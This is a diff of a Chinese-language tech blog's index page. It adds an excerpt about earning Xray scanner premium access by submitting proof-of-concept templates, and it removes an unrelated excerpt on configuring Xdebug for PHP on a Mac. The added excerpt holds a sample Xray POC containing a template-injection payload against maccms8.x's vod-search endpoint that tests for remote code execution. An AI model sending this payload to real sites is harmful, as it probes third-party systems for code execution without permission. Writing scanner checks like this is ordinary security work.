@@ -174,6 +174,68 @@
     
     
     <div class="col-12 col-md-8 mx-auto index-info">
+      <a href="/如何申请Xray高级版.html">
+        <p class="h4 index-header">如何申请Xray高级版</p>
+      </a>
+
+      <a href="/如何申请Xray高级版.html">
+        
+        
+          
+        
+        <div class="index-excerpt">
+          <div class="index-text mb-1">找一个Nday
+https://www.exploit-db.com/
+
+零组资料库
+
+CNVD
+
+…
+
+
+编写POC示例:
+name: poc-漏洞产品-[CVE编号]-描述[rce/weakpasswd...]
+set:
+  r: randomInt(800000000, 1000000000)
+rules:
+  - method: GET
+    path: /index.php?m=vod-search&amp;wd={if-A:printf(md5({{r}}))}{endif-A}
+    follow_redirects: false
+    expression: |
+      response.body.bcontains(bytes(md5(string(r))))
+detail:
+  Affected Version: &quot;maccms8.x&quot;
+  author: hanxiansheng26(https://github.com/hanxiansheng26)
+  links:
+    - https://www.cnblogs.com/te</div>
+        </div>
+      </a>
+
+      <div class="index-btm">
+        
+          <i class="iconfont icon-riqi2"></i>&nbsp;2020-08-21&nbsp;&nbsp;
+        
+        
+          <i class="iconfont icon-inbox"></i>
+          
+            <a href="/categories/web">web</a>&nbsp;
+          &nbsp;
+        
+        
+          <i class="iconfont icon-tag"></i>
+          
+            <a href="/tags/xray">xray</a>&nbsp;
+          
+        
+      </div>
+    </div>
+  </div>
+
+  <div class="row mx-auto index-card">
+    
+    
+    <div class="col-12 col-md-8 mx-auto index-info">
       <a href="/Golang多核-并行.html">
         <p class="h4 index-header">Golang多核 并行</p>
       </a>
@@ -658,64 +720,6 @@ JAVA_HOME=/Library/Java/JavaVirtualMachines/jdk1.8.0_211.jdk/Contents/Home
           <i class="iconfont icon-tag"></i>
           
             <a href="/tags/mac">mac</a>&nbsp;
-          
-        
-      </div>
-    </div>
-  </div>
-
-  <div class="row mx-auto index-card">
-    
-    
-    <div class="col-12 col-md-8 mx-auto index-info">
-      <a href="/Mac-PHP调试环境搭建.html">
-        <p class="h4 index-header">Mac PHP调试环境搭建</p>
-      </a>
-
-      <a href="/Mac-PHP调试环境搭建.html">
-        
-        
-          
-        
-        <div class="index-excerpt">
-          <div class="index-text mb-1">前言需要的工具MxSrvs、PHPStorm、Xdebug helper
-配置MxSrvs
-启动软件
-
-
-打开配置编辑，编辑php.ini
-
-
-配置Xdebug
-MxSrvs默认自带Xdebug，不需要去下载，配置如下图:
-
-[xdebug]
-zend_extension = &quot;/Applications/MxSrvs/bin/php/ext/xdebug.so&quot;
-xdebug.remote_enable=1
-xdebug.remote_connect_back=1
-xdebug.var_display_max_depth = 512
-xdebug.profiler_append = 1
-xdebug.profiler_enable_trigger = 1
-xdebug.max_nesting_level = 200
-xdebug.profiler_output_dir = &quot;/Applications/MxSrvs/logs/xdebug&quot;
-xdebug.profiler_output_name = &quot;cachegrind.out.%</div>
-        </div>
-      </a>
-
-      <div class="index-btm">
-        
-          <i class="iconfont icon-riqi2"></i>&nbsp;2020-03-19&nbsp;&nbsp;
-        
-        
-          <i class="iconfont icon-inbox"></i>
-          
-            <a href="/categories/web">web</a>&nbsp;
-          &nbsp;
-        
-        
-          <i class="iconfont icon-tag"></i>
-          
-            <a href="/tags/php%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA">php调试环境搭建</a>&nbsp;
           
         
       </div>
